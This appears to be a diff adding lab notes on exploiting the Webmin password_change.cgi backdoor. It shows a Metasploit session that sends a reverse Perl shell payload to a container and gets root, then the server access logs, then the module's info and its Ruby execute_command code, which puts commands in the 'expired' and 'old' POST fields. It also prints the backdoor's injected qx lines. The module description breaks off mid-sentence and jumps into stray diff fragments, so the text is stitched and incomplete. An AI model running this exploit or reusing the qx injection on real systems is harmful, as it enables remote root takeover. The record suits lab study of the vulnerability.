@@ -1,0 +1,149 @@
+
+msf6 exploit(linux/http/webmin_backdoor) > run
+
+[*] Started reverse TCP handler on 172.20.0.3:4444 
+[!] AutoCheck is disabled, proceeding with exploitation
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[-] Exploit failed: Errno::ENOTCONN Socket not connected - getpeername(2)
+[*] Exploit completed, but no session was created.
+msf6 exploit(linux/http/webmin_backdoor) > [*] Command shell session 1 opened (172.20.0.3:4444 -> 172.20.0.2:49640) at 2026-06-09 11:16:11 +0000
+
+msf6 exploit(linux/http/webmin_backdoor) > sessions -i 1
+[*] Starting interaction with 1...
+
+whoami
+root
+hostname
+ed6f84232187
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/usr/share/webmin/acl
+
+---------------------------------------
+
+webmin logs:
++ service webmin start
++ touch /var/webmin/miniserv.log
++ exec tail -f /var/webmin/miniserv.log
+172.20.0.1 - - [02/Jun/2026:10:43:44 +0000] "GET /images/favicons/webmin/site.webmanifest HTTP/1.1" 401 4563
+172.20.0.3 - - [02/Jun/2026:10:57:23 +0000] "GET / HTTP/1.1" 401 4564
+172.20.0.3 - - [02/Jun/2026:10:58:35 +0000] "GET / HTTP/1.1" 401 4564
+172.20.0.3 - - [02/Jun/2026:11:01:33 +0000] "GET / HTTP/1.1" 401 4564
+172.20.0.3 - - [02/Jun/2026:11:04:59 +0000] "POST /password_change.cgi HTTP/1.1" 200 48567
+172.20.0.1 - - [09/Jun/2026:10:41:17 +0000] "GET /unauthenticated/css/bundle.min.css?1933999999999901 HTTP/1.1" 200 128144
+172.20.0.1 - - [09/Jun/2026:10:41:17 +0000] "GET / HTTP/1.1" 401 4563
+tail: unrecognized file system type 0x794c7630 for '/var/webmin/miniserv.log'. please report this to bug-coreutils@gnu.org. reverting to polling
+172.20.0.1 - - [09/Jun/2026:10:41:17 +0000] "GET /unauthenticated/css/fonts-roboto.min.css?1933999999999901 HTTP/1.1" 200 351590
+172.20.0.1 - - [09/Jun/2026:10:41:17 +0000] "GET /images/favicons/webmin/favicon-32x32.png HTTP/1.1" 200 1787
+172.20.0.1 - - [09/Jun/2026:10:41:17 +0000] "GET /images/favicons/webmin/site.webmanifest HTTP/1.1" 401 4563
+172.20.0.3 - - [09/Jun/2026:11:16:05 +0000] "POST /password_change.cgi HTTP/1.1" 200 48567
+
+-----------------------------------------------------
+
+less /usr/src/metasploit-framework/modules/exploits/linux/http/webmin_backdoor.rb:
+
+msf6 exploit(linux/http/webmin_backdoor) > info exploit/linux/http/webmin_backdoor
+
+       Name: Webmin password_change.cgi Backdoor
+     Module: exploit/linux/http/webmin_backdoor
+   Platform: Unix, Linux
+       Arch: cmd, x86, x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-08-10
+
+Provided by:
+  AkkuS
+  wvu <wvu@metasploit.com>
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Automatic (Unix In-Memory)
+      1   Automatic (Linux Dropper)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT      10000            yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+  TARGETURI  /                yes       Base path to Webmin
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  This module exploits a backdoor in Webmin versions 1.890 through 1.920.
+  Only the SourceForge downloads were backdoored, but they are listed as
+  official downloads on the project's site.
+
+  Unknown attacker(s) inserted Perl qx statements into the build server's
+  $in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;
+2:12c
+3:12c
+  $miniserv{'passwd_mode'} == 2 || die "Password changing is not enabled!";
+====3
+1:40c
+2:40c
+  	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'});
+3:40c
+  	$enc eq $wuser->{'pass'} || &pass_error($text{'password_eold'},qx/$in{'old'}/);
+====3
+1:200c
+2:200c
+  # Show ok page
+3:200c
+
+wvu@kharak:~/Downloads$
+=end
+  def execute_command(cmd, _opts = {})
+    send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'password_change.cgi'),
+      'headers'   => {'Referer' => full_uri},
+      'vars_post' => {
+        # 1.890
+        'expired' => cmd,
+        # 1.900-1.920
+        'new1'    => token,
+        'new2'    => token,
+        'old'     => cmd
+      }
+    }, 3.5)
+  end
+
+  def token
+    @token ||= Rex::Text.rand_text_alphanumeric(8..42)
+  end
+
+end
+
+~
